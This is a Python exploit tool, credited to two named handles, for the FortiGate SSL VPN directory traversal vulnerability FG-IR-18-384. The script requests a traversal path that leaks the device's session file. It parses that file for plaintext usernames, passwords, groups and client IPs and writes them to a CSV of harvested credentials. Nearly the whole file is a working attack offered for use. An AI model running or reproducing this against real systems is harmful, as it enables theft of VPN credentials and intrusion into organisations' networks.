#!/usr/bin/python3

################################################
#      ____    _                   _           #
#     |__  |__| |___ _ __  ___ _ _| |_ ___     #
#       / / -_) / -_) '  \/ -_) ' \  _(_-<     #
#      /_/\___|_\___|_|_|_\___|_||_\__/__/     #
#                                              #
################################################
# Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)
# John M (@x41x41x41), David S (@DavidStubley)
# Fortigate

import argparse, urllib.request, ssl, csv, string, socket
from IPy import IP
import OpenSSL.crypto as crypto

def exploit(target):
	target = target.strip()
	print('[*] '+str(target)+' processing')
	try:
		url = 'https://'+str(target)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
		req = urllib.request.urlopen(url, None, context=NOSSL, timeout=5)
		result = req.read()
		if req.code == int(200) and str('var fgt_lang =') in str(result):
			subjectCN = getSubjectCN(target)
			print('[!] '+str(target)+' ('+subjectCN+') appears to be vulnerable ('+str(len(result))+') bytes returned')
			parse(target, result, subjectCN)
		else:
			print('[!] '+str(target)+' does not appear to be vulnerable')
	except urllib.error.HTTPError as e:
		print('[!] '+str(target)+' does not appear to be vulnerable ('+str(e.code)+', +'+str(e.reason)+')')
	except urllib.error.URLError as e:
		print('[!] '+str(target)+' does not appear to be vulnerable (URL seems to be invalid)')
	except TimeoutError:
		print('[!] '+str(target)+' Timed Out')
	except:   
		print('[!] '+str(target)+' unhandled error :(')

def parse(target, process, subjectCN):
	unprintable = False
	comp = bytearray()
	counter = 0
	foundcount = 0
	for byte in process:
		if byte == 0x00:
			# Throw these out
			counter = counter + 1
			continue
		comp.append(byte)
		comp = comp[-2:]
		if comp == LOOKFOR or comp == LOOKFORTWO:
			grabuser(target, process, counter, subjectCN)
			foundcount = foundcount + 1
		counter= counter + 1
	if foundcount == 0:
		containsIP(process, target)
	# Commented out as we don't need these but could come in useful for debugging
	#print(getBinarytext(process,0,len(process)))
	#writeBinary(process, target)

def getSubjectCN(url):
    try:
        if ':' in url:
            urlsplit = url.split(':')
            print(urlsplit)
            dst = (urlsplit[0],int(urlsplit[1]))
        else:
            dst = (url,443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        return x509.get_subject().CN
    except: 
        return '[?] SSL NAME Grab Error Proberbly Timed Out'

def grabuser(target, process, frombyte, subjectCN):	
	extip = grabtext(process,frombyte+1)
	if isIP(extip):
		username = grabtext(process,frombyte+37)
		password = grabtext(process,frombyte+423)
		group = grabtext(process,frombyte+552)
		print('[!] '+str(target)+' ('+subjectCN+') USERFOUND U:'+str(username)+', P:'+str(password)+', G:'+str(group)+', IP:'+str(extip))
		# Prob not the best way to do this but it works...
		RESULTS.append([str(target), str(subjectCN), str(username), str(password), str(group), str(extip)])
	#else:
	#	print('[?] False Positive: '+extip)

def grabtext(process,startbyte):
	tmpstr = ''
	for byte in process[startbyte:]:
		if byte in PRINTABLE:
			tmpstr+=chr(byte)
		else:
			break
	return tmpstr

def writeBinary(process,target):
	f = open('byteoutput_'+target+'.bin', "wb")
	f.write(bytearray(process))

def getBinarytext(process,startbyte,endbyte):
	text = ''
	try:
		unprintable = False
		for byte in process[startbyte:endbyte]:
			if byte in PRINTABLE:
				text = text + chr(byte)
				unprintable = False
			else:
				if unprintable == False:
					text = text + '...'
					unprintable = True
	except Exception as e:   
	    print('[!] '+str(e))
	return text

def isIP(lookup):
	try:
		IP(lookup)
		return True
	except:
		return False

def containsIP(process, target):
	# Hacky IPv4 check to see if we missed creds whilst egg hunting, if we did spit out the BIN for analysis
	# hexdump -C byteoutput_TARGET.bin | more
	m = re.match(r"((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)))",getBinarytext(process,0,len(process)))
	if m:
		print('[?] '+str(target)+' IPs found but no creds, check the bytes used to hunt')
		writeBinary(process, target)


print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
 | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
 | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
""")
print("Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)")
print("Tool developed by @x41x41x41 and @DavidStubley")
print()

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--input', default='127.0.0.1', help='Target URL or Domain')
parser.add_argument('-o', '--output', default='creds.txt', help='File to output discovered credentials too')
args = parser.parse_args()

# Setup varibles
INPUT = args.input
OUTPUTFILE = args.output
PRINTABLE = set(bytes(string.printable, 'ascii'))
RESULTS = []
NOSSL = ssl.SSLContext()
LOOKFOR = bytearray([0x5d,0x01])
LOOKFORTWO = bytearray([0x5c,0x01])

# Read and kickoff processing
exploit(INPUT)

# Output results
count = 0
with open(OUTPUTFILE, mode='a') as csvfile:
    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
    for result in RESULTS:
    	CSV_WRITER.writerow(result)
    	count=count+1
print('[*] Finished '+str(count)+' credentials found')